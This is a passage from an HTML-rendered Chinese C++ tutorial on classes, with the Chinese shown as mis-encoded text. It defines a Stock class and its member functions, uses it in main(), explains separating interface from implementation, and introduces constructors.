class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€šå¸¸æ”¾åœ¨æºæ–‡ä»¶ (e.g., stock.cpp) ä¸­</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// åŒ…å«ç±»å®šä¹‰çš„å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ :: æŒ‡æ˜å‡½æ•°å±äº Stock ç±»</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::acquire</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr)</span> </span>&#123;</span><br><span class="line">    company = co;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares can&#x27;t be negative; &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>;</span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot(); <span class="comment">// è°ƒç”¨ç§æœ‰æˆå‘˜å‡½æ•°è®¡ç®—æ€»å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price; <span class="comment">// å‡è®¾æŒ‰æ–°ä»·æ ¼è®¡ç®—</span></span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price; <span class="comment">// å‡è®¾æŒ‰æ–°ä»·æ ¼è®¡ç®—</span></span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„ const å…³é”®å­—åœ¨å‡½æ•°å®šä¹‰å’Œå£°æ˜ä¸­éƒ½è¦æœ‰</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è®¾ç½®è¾“å‡ºæ ¼å¼</span></span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="comment">// è®¾ç½®ç²¾åº¦ä¸º2ä½å°æ•°æ˜¾ç¤ºæ€»ä»·</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¢å¤åŸå§‹æ ¼å¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„ï¼šç§æœ‰æˆå‘˜å‡½æ•° set_tot() ä¹Ÿå¯ä»¥åœ¨ç±»å¤–éƒ¨å®šä¹‰ï¼Œ</span></span><br><span class="line"><span class="comment">// ä½†å› ä¸ºå®ƒå¾ˆç®€å•ï¼Œé€šå¸¸ä¼šç›´æ¥åœ¨ç±»å®šä¹‰å†…éƒ¨å®ç°ï¼ˆå¦‚ä¸Šæ‰€ç¤ºï¼‰ï¼Œ</span></span><br><span class="line"><span class="comment">// è¿™æ ·å®ƒå°±å¯èƒ½è¢«ç¼–è¯‘å™¨è§†ä¸ºå†…è”å‡½æ•°ã€‚</span></span><br><span class="line"><span class="comment">// å¦‚æœåœ¨å¤–éƒ¨å®šä¹‰ï¼š</span></span><br><span class="line"><span class="comment">// void Stock::set_tot() &#123;</span></span><br><span class="line"><span class="comment">//     total_val = shares * share_val;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><p><strong><code>const</code> æˆå‘˜å‡½æ•°:</strong><br>åœ¨ <code>show()</code> å‡½æ•°å£°æ˜å’Œå®šä¹‰çš„æœ«å°¾éƒ½æœ‰ <code>const</code> å…³é”®å­—ã€‚è¿™è¡¨æ˜ <code>show()</code> æ˜¯ä¸€ä¸ª<strong>å¸¸é‡æˆå‘˜å‡½æ•°</strong>ï¼Œå®ƒæ‰¿è¯ºä¸ä¼šä¿®æ”¹è°ƒç”¨å®ƒçš„å¯¹è±¡çš„æ•°æ®æˆå‘˜ã€‚è¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå®‰å…¨æ€§ï¼Œå¹¶å…è®¸å¯¹ <code>const</code> å¯¹è±¡è°ƒç”¨æ­¤å‡½æ•°ã€‚</p><h3 id="10-2-4-ä½¿ç”¨ç±»"><a href="#10-2-4-ä½¿ç”¨ç±»" class="headerlink" title="10.2.4 ä½¿ç”¨ç±»"></a>10.2.4 ä½¿ç”¨ç±»</h3><p>ä¸€æ—¦å®šä¹‰äº†ç±»ï¼ˆè“å›¾ï¼‰ï¼Œä½ å°±å¯ä»¥åˆ›å»ºè¯¥ç±»çš„<strong>å¯¹è±¡ (Objects)</strong> æˆ–**å®ä¾‹ (Instances)**ã€‚åˆ›å»ºå¯¹è±¡å°±åƒå£°æ˜ä¸€ä¸ªåŸºæœ¬ç±»å‹çš„å˜é‡ä¸€æ ·ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ main() å‡½æ•°æˆ–å…¶ä»–å‡½æ•°ä¸­</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// éœ€è¦åŒ…å«ç±»å®šä¹‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸¤ä¸ª Stock å¯¹è±¡ (å®ä¾‹)</span></span><br><span class="line">    Stock stock1;</span><br><span class="line">    Stock stock2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç‚¹å· . (æˆå‘˜è®¿é—®è¿ç®—ç¬¦) è°ƒç”¨å¯¹è±¡çš„å…¬æœ‰æˆå‘˜å‡½æ•°</span></span><br><span class="line">    stock1.acquire(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">20</span>, <span class="number">12.50</span>);</span><br><span class="line">    stock1.show(); <span class="comment">// æ˜¾ç¤º stock1 çš„ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">    stock2.acquire(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">2</span>, <span class="number">180.0</span>);</span><br><span class="line">    stock2.show(); <span class="comment">// æ˜¾ç¤º stock2 çš„ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">    stock2.buy(<span class="number">5</span>, <span class="number">190.0</span>); <span class="comment">// å¢æŒ stock2</span></span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    stock1.sell(<span class="number">10</span>, <span class="number">15.75</span>); <span class="comment">// å–å‡ºéƒ¨åˆ† stock1</span></span><br><span class="line">    stock1.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯ï¼ä¸èƒ½ç›´æ¥è®¿é—®ç§æœ‰æˆå‘˜</span></span><br><span class="line">    <span class="comment">// stock1.shares = 50; // ç¼–è¯‘é”™è¯¯</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; stock1.company; // ç¼–è¯‘é”™è¯¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>Stock stock1;</code> åˆ›å»ºäº†ä¸€ä¸ªåä¸º <code>stock1</code> çš„ <code>Stock</code> ç±»å‹çš„å¯¹è±¡ã€‚</li><li>  ä½¿ç”¨<strong>æˆå‘˜è®¿é—®è¿ç®—ç¬¦ï¼ˆç‚¹å· <code>.</code>ï¼‰</strong>æ¥è°ƒç”¨å¯¹è±¡çš„å…¬æœ‰æˆå‘˜å‡½æ•°ï¼Œä¾‹å¦‚ <code>stock1.acquire(...)</code> æˆ– <code>stock2.show()</code>ã€‚</li><li>  æ¯ä¸ªå¯¹è±¡éƒ½æœ‰è‡ªå·±çš„ä¸€å¥—æ•°æ®æˆå‘˜ã€‚<code>stock1</code> çš„ <code>shares</code> å’Œ <code>stock2</code> çš„ <code>shares</code> æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚</li><li>  ä½ ä¸èƒ½ä»å¯¹è±¡å¤–éƒ¨ç›´æ¥è®¿é—® <code>private</code> æˆå‘˜ï¼Œè¿™å¼ºåˆ¶ä½ å¿…é¡»é€šè¿‡ç±»æä¾›çš„å…¬å…±æ¥å£ï¼ˆ<code>public</code> å‡½æ•°ï¼‰æ¥ä¸å¯¹è±¡äº¤äº’ã€‚</li></ul><h3 id="10-2-5-ä¿®æ”¹å®ç°"><a href="#10-2-5-ä¿®æ”¹å®ç°" class="headerlink" title="10.2.5 ä¿®æ”¹å®ç°"></a>10.2.5 ä¿®æ”¹å®ç°</h3><p>å°†ç±»çš„æ¥å£ï¼ˆå¤´æ–‡ä»¶ä¸­çš„å£°æ˜ï¼‰å’Œå®ç°ï¼ˆæºæ–‡ä»¶ä¸­çš„å®šä¹‰ï¼‰åˆ†å¼€çš„ä¸€ä¸ªä¸»è¦å¥½å¤„æ˜¯<strong>å°è£…</strong>å¸¦æ¥çš„çµæ´»æ€§ã€‚</p><ul><li>  <strong>æ¥å£ (Interface):</strong> å¤´æ–‡ä»¶ (<code>stock.h</code>) å®šä¹‰äº†å¦‚ä½•<strong>ä½¿ç”¨</strong>è¿™ä¸ªç±»ï¼ˆå…¬å…±æˆå‘˜å‡½æ•°ï¼‰ã€‚ä½¿ç”¨ç±»çš„ä»£ç ï¼ˆå¦‚ <code>main()</code> å‡½æ•°ï¼‰åªéœ€è¦åŒ…å«å¤´æ–‡ä»¶ã€‚</li><li>  <strong>å®ç° (Implementation):</strong> æºæ–‡ä»¶ (<code>stock.cpp</code>) åŒ…å«äº†æˆå‘˜å‡½æ•°å…·ä½“å¦‚ä½•å·¥ä½œã€‚</li></ul><p>åªè¦ç±»çš„<strong>å…¬å…±æ¥å£ä¿æŒä¸å˜</strong>ï¼ˆå‡½æ•°åã€å‚æ•°ã€è¿”å›ç±»å‹ä¸å˜ï¼‰ï¼Œä½ å°±å¯ä»¥è‡ªç”±åœ°ä¿®æ”¹æºæ–‡ä»¶ä¸­çš„<strong>å®ç°ç»†èŠ‚</strong>ï¼ˆä¾‹å¦‚ï¼Œæ”¹è¿› <code>set_tot</code> çš„è®¡ç®—æ–¹å¼ï¼Œæˆ–è€…æ”¹å˜å†…éƒ¨æ•°æ®çš„å­˜å‚¨æ–¹å¼ï¼‰ï¼Œè€Œ<strong>ä¸éœ€è¦ä¿®æ”¹æˆ–é‡æ–°ç¼–è¯‘</strong>ä½¿ç”¨è¯¥ç±»çš„å…¶ä»–ä»£ç æ–‡ä»¶ï¼ˆå¦‚åŒ…å« <code>main()</code> çš„æ–‡ä»¶ï¼‰ã€‚åªéœ€è¦é‡æ–°ç¼–è¯‘å®ç°æ–‡ä»¶ (<code>stock.cpp</code>) å¹¶é‡æ–°é“¾æ¥å³å¯ã€‚</p><p>è¿™å¤§å¤§é™ä½äº†ç»´æŠ¤æˆæœ¬ï¼Œå¹¶ä½¿å¾—ä»£ç åº“æ›´å®¹æ˜“æ›´æ–°å’Œæ”¹è¿›ã€‚ç”¨æˆ·åªå…³å¿ƒâ€œèƒ½åšä»€ä¹ˆâ€ï¼ˆæ¥å£ï¼‰ï¼Œè€Œä¸å¿…å…³å¿ƒâ€œæ€ä¹ˆåšâ€ï¼ˆå®ç°ï¼‰ã€‚</p><h3 id="10-2-6-å°ç»“"><a href="#10-2-6-å°ç»“" class="headerlink" title="10.2.6 å°ç»“"></a>10.2.6 å°ç»“</h3><ul><li>  <strong>æŠ½è±¡</strong>æ˜¯å…³æ³¨æœ¬è´¨ã€å¿½ç•¥ç»†èŠ‚çš„ç¼–ç¨‹æ€æƒ³ã€‚</li><li>  <strong>ç±»</strong>æ˜¯C++å®ç°æŠ½è±¡å’Œåˆ›å»ºç”¨æˆ·å®šä¹‰ç±»å‹çš„ä¸»è¦æœºåˆ¶ã€‚</li><li>  ç±»å°†<strong>æ•°æ®ï¼ˆæˆå‘˜å˜é‡ï¼‰</strong>å’Œ<strong>æ“ä½œæ•°æ®çš„å‡½æ•°ï¼ˆæˆå‘˜å‡½æ•°ï¼‰</strong>æ†ç»‘åœ¨ä¸€èµ·ã€‚</li><li>  <strong>è®¿é—®è¯´æ˜ç¬¦</strong>ï¼ˆ<code>public</code>, <code>private</code>, <code>protected</code>ï¼‰æ§åˆ¶å¯¹ç±»æˆå‘˜çš„è®¿é—®ã€‚</li><li>  <strong>æ•°æ®éšè—</strong>ï¼ˆé€šå¸¸å°†æ•°æ®è®¾ä¸º <code>private</code>ï¼‰æ˜¯å°è£…çš„å…³é”®ï¼Œä¿æŠ¤æ•°æ®å¹¶éšè—å®ç°ç»†èŠ‚ã€‚</li><li>  <strong>å…¬å…±æ¥å£</strong>ï¼ˆ<code>public</code> æˆå‘˜å‡½æ•°ï¼‰å®šä¹‰äº†å¦‚ä½•ä¸ç±»çš„å¯¹è±¡äº¤äº’ã€‚</li><li>  æˆå‘˜å‡½æ•°é€šå¸¸åœ¨ç±»å¤–éƒ¨ä½¿ç”¨<strong>ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code></strong> æ¥å®šä¹‰ã€‚</li><li>  ä½¿ç”¨<strong>ç‚¹å· <code>.</code></strong> è®¿é—®å¯¹è±¡çš„å…¬æœ‰æˆå‘˜ã€‚</li><li>  å°†æ¥å£å’Œå®ç°åˆ†ç¦»ï¼ˆå¤´æ–‡ä»¶/æºæ–‡ä»¶ï¼‰å¯ä»¥æé«˜ä»£ç çš„æ¨¡å—åŒ–å’Œå¯ç»´æŠ¤æ€§ã€‚</li></ul><h2 id="10-3-ç±»çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°"><a href="#10-3-ç±»çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°" class="headerlink" title="10.3 ç±»çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°"></a>10.3 ç±»çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°</h2><p>åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª <code>Stock</code> ç±»ï¼Œå¹¶é€šè¿‡ <code>acquire()</code> æˆå‘˜å‡½æ•°æ¥è®¾ç½®å…¶åˆå§‹çŠ¶æ€ã€‚ç„¶è€Œï¼ŒC++ æä¾›äº†ä¸€ç§æ›´è‡ªåŠ¨åŒ–ã€æ›´ä¸“é—¨åŒ–çš„æ–¹å¼æ¥å¤„ç†å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†å·¥ä½œï¼š<strong>æ„é€ å‡½æ•° (Constructor)</strong> å’Œ **ææ„å‡½æ•° (Destructor)**ã€‚</p><h3 id="10-3-1-å£°æ˜å’Œå®šä¹‰æ„é€ å‡½æ•°"><a href="#10-3-1-å£°æ˜å’Œå®šä¹‰æ„é€ å‡½æ•°" class="headerlink" title="10.3.1 å£°æ˜å’Œå®šä¹‰æ„é€ å‡½æ•°"></a>10.3.1 å£°æ˜å’Œå®šä¹‰æ„é€ å‡½æ•°</h3><p><strong>æ„é€ å‡½æ•°</strong>æ˜¯ä¸€ç§ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯åœ¨åˆ›å»ºç±»çš„å¯¹è±¡æ—¶<strong>åˆå§‹åŒ–</strong>è¯¥å¯¹è±¡çš„æ•°æ®æˆå‘˜ã€‚</p><p><strong>ç‰¹ç‚¹ä¸è§„åˆ™:</strong></p><ol><li> <strong>åç§°ä¸ç±»åç›¸åŒ:</strong> æ„é€ å‡½æ•°çš„åç§°å¿…é¡»ä¸å®ƒæ‰€å±çš„ç±»çš„åç§°å®Œå…¨ä¸€æ ·ã€‚</li><li> <strong>æ²¡æœ‰è¿”å›ç±»å‹:</strong> æ„é€ å‡½æ•°æ²¡æœ‰å£°æ˜è¿”å›ç±»å‹ï¼Œè¿ <code>void</code> ä¹Ÿæ²¡æœ‰ã€‚</li><li> <strong>è‡ªåŠ¨è°ƒç”¨:</strong> å½“åˆ›å»ºç±»çš„å¯¹è±¡æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨è°ƒç”¨ç›¸åº”çš„æ„é€ å‡½æ•°ã€‚</li><li> <strong>å¯ä»¥é‡è½½:</strong> ä¸€ä¸ªç±»å¯ä»¥æœ‰å¤šä¸ªæ„é€ å‡½æ•°ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°åˆ—è¡¨ä¸åŒï¼ˆå‚æ•°ä¸ªæ•°ã€ç±»å‹æˆ–é¡ºåºä¸åŒï¼‰ã€‚è¿™å…è®¸ä»¥ä¸åŒçš„æ–¹å¼åˆå§‹åŒ–å¯¹è±¡ã€‚</li></ol><p><strong>å£°æ˜è¯­æ³• (åœ¨ç±»å®šä¹‰å†…):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°å£°æ˜ (æ— å‚æ•°)</span></span><br><span class="line">    ClassName();</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°å£°æ˜ (å¸¦å‚æ•°)</span></span><br><span class="line">    ClassName(ParameterList);</span><br><span class="line">    <span class="comment">// ... å…¶ä»–æˆå‘˜ ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>å®šä¹‰è¯­æ³• (åœ¨ç±»å¤–éƒ¨):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ— å‚æ•°æ„é€ å‡½æ•°å®šä¹‰</span></span><br><span class="line">ClassName::ClassName() &#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–ä»£ç </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¸¦å‚æ•°æ„é€ å‡½æ•°å®šä¹‰</span></span><br><span class="line">ClassName::ClassName(ParameterList) &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨å‚æ•°è¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼šä¸º <code>Stock</code> ç±»æ·»åŠ æ„é€ å‡½æ•°</strong></p><p>æˆ‘ä»¬å¯ä»¥ä¸º <code>Stock</code> ç±»æ·»åŠ æ„é€ å‡½æ•°æ¥æ›¿ä»£ä¹‹å‰çš„ <code>acquire()</code> å‡½æ•°çš„éƒ¨åˆ†åŠŸèƒ½ï¼Œç¡®ä¿å¯¹è±¡åœ¨åˆ›å»ºæ—¶å°±è¢«èµ‹äºˆæœ‰æ„ä¹‰çš„åˆå§‹å€¼ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ stock.h çš„ç±»å®šä¹‰ä¸­å£°æ˜</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°å£°æ˜ (ä¸¤ä¸ªç‰ˆæœ¬)</span></span><br><span class="line">    Stock(); <span class="comment">// é»˜è®¤æ„é€ å‡½æ•° (æ— å‚æ•°)</span></span><br><span class="line">    Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n = <span class="number">0</span>, <span class="keyword">double</span> pr = <span class="number">0.0</span>); <span class="comment">// å¸¦å‚æ•°çš„æ„é€ å‡½æ•° (ä½¿ç”¨é»˜è®¤å‚æ•°)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸å†éœ€è¦ acquire()ï¼Œå› ä¸ºæ„é€ å‡½æ•°å¤„ç†äº†åˆå§‹è®¾ç½®</span></span><br><span class="line">    <span class="comment">// void acquire(const std::string &amp;co, long n, double pr);</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ stock.cpp ä¸­å®šä¹‰æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é»˜è®¤æ„é€ å‡½æ•°å®šä¹‰</span></span><br><span class="line">Stock::Stock() &#123; <span class="comment">// é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default constructor called\n&quot;</span>; <span class="comment">// åªæ˜¯ä¸ºäº†æ¼”ç¤º</span></span><br><span class="line">    company = <span class="string">&quot;no name&quot;</span>;</span><br><span class="line">    shares = <span class="number">0</span>;</span><br><span class="line">    share_val = <span class="number">0.0</span>;</span><br><span class="line">    total_val = <span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br><span 